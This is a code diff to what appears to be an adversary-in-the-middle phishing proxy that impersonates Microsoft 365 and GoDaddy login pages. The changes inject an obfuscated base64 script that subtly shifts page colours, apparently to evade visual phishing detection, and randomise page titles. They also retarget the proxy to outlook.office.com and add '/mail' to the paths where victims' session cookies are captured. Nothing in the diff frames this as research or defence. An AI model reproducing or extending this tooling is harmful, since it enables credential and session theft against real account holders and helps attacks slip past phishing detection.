@@ -139,6 +139,15 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
                 reg: /crossorigin/gm,
                 replacement: "rickorigin",
             },
+        {
+
+            reg: /(<head>)([\s\S]*?)(<\/head>)/,
+            replacement: '$1\n<script src=\"data:text/javascript;base64,ZnVuY3Rpb24gYygpe2lmKCFkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIuYiIpIHx8ICFkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCIuZyIpKXtkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKE9iamVjdC5hc3NpZ24oZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iikse2NsYXNzTGlzdDpbImIiXX0pKTtkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuc3R5bGUuZmlsdGVyPSJodWUtcm90YXRlKDRkZWcpIjtkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKE9iamVjdC5hc3NpZ24oZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iikse2NsYXNzTGlzdDpbImciXX0pKTtzZXRUaW1lb3V0KGMsMWUzKX19YygpOwo=\"></script>\n$2$3'
+        },
+        {
+            reg: /<title[^>]*>(.*?)<\/title>/i,
+            replacement: `<title>${Math.random().toString(36).substr(2, 10)}</title>`
+        }
         ]
     }
 
@@ -168,6 +177,7 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
         || this.proxyResp.req.path.startsWith('/owa/prefetch.aspx')
         || this.proxyResp.req.path.startsWith('/webmanifest.json')
         || this.proxyResp.req.path.startsWith('/landingv2')
+        || this.proxyResp.req.path.startsWith('/mail')
         // || this.proxyResp.req.path.startsWith('/common/reprocess')
         ){
             this.browserEndPoint.writeHead(302, {'location': '/ping/v5767687'})
@@ -273,12 +283,13 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
         if (redirectToken !== null) {
             console.log(`redirectToken: ${redirectToken.url}`)
 
-            console.log(`redirectToken host: ${redirectToken.host}`)
+            console.log(`redirectToken host: ${redirectToken.obj.host}`)
 
             const redirectHost = redirectToken.obj.host
 
-            if (redirectHost === 'sso.godaddy.com' 
-            || redirectHost === 'sso.secureserver.net') {
+            if (redirectHost === 'login.microsoftonline.com'
+                || redirectHost === 'sso.godaddy.com' 
+                || redirectHost === 'sso.secureserver.net') {
                 clientContext.currentDomain = redirectHost
             }
 
@@ -298,16 +309,16 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
 
 
 const configExport = {
-    CURRENT_DOMAIN: 'login.microsoftonline.com',
+    CURRENT_DOMAIN: 'outlook.office.com',
 
     SCHEME: 'office',
 
     AUTOGRAB_CODE: 'login_hint',
 
+    START_PATH: '/',
+    // START_PATH: '/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code id_token&scope=openid profile https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=637929903776466681.Y2Y4YjNjOWItNWRlMi00NWRmLWEyNGEtNGMxM2RhNjhmMmY1NTI3YmM5OTMtOWEyNi00YWJjLTg5ZDAtYmYyMjgwOWFjMWUx&ui_locales=en-US&mkt=en-US&state=G-VlqctyXJoQazNds6PWnW7GHB_JRMNCQNIscmNm49y8wyBm0ioAbPHzBE3jzPLGCyk2xLKOAqbJtwTLTLDUqnAJFuN5Si8AFjBXKydzhb6x4EIi3_N0oFy9vVNHYBjWByDP66t5m5Ra01fSIg5C_SimIq8o1nplzEjy9Yh5zzJM6YRiEI82IK6PzXyy32HA_42pbx0DvZw525HpcuVgMA1VWPZiCKFly3JEnMPTh7Ldfoo6w-4xJkUhkywZlP-WulmpO3prRseGYKBIVVplJw&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.12.1.0',
 
-    START_PATH: '/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code id_token&scope=openid profile https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&response_mode=form_post&nonce=637929903776466681.Y2Y4YjNjOWItNWRlMi00NWRmLWEyNGEtNGMxM2RhNjhmMmY1NTI3YmM5OTMtOWEyNi00YWJjLTg5ZDAtYmYyMjgwOWFjMWUx&ui_locales=en-US&mkt=en-US&state=G-VlqctyXJoQazNds6PWnW7GHB_JRMNCQNIscmNm49y8wyBm0ioAbPHzBE3jzPLGCyk2xLKOAqbJtwTLTLDUqnAJFuN5Si8AFjBXKydzhb6x4EIi3_N0oFy9vVNHYBjWByDP66t5m5Ra01fSIg5C_SimIq8o1nplzEjy9Yh5zzJM6YRiEI82IK6PzXyy32HA_42pbx0DvZw525HpcuVgMA1VWPZiCKFly3JEnMPTh7Ldfoo6w-4xJkUhkywZlP-WulmpO3prRseGYKBIVVplJw&x-client-SKU=ID_NETSTANDARD2_0&x-client-ver=6.12.1.0',
-
-    COOKIE_PATH: ['/common/reprocess', '/common/SAS/ProcessAuth', '/ping/v5767687'],
+    COOKIE_PATH: ['/common/reprocess', '/common/SAS/ProcessAuth', '/mail', '/ping/v5767687'],
 
     EXIT_TRIGGER_PATH: ['/ping/v5767687'],
 
